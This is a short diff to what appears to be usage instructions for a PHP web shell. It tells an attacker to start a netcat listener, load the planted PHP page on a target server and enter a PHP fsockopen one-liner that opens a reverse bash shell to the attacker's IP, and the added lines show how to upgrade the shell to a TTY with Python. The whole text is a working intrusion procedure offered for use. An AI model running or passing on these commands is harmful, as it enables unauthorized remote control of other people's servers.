@@ -6,4 +6,6 @@ At attacker side run "nc -lvp $ATTACKER_PORT" (ex: nc -lvp 1234).
 Then access http://server_IP/location_of_9090909090101010101010.php.
 and input php -r '$sock=fsockopen("$Attacker_IP",$ATTACKER_PORT);exec("/bin/bash -i <&3 >&3 2>&3");' and hit Run.
 Reverse shell will be created at attacker side.
-Run 
+
+After getting session at attacker side run "python -c 'import pty; pty.spawn("/bin/bash")'" to get TTY session
+
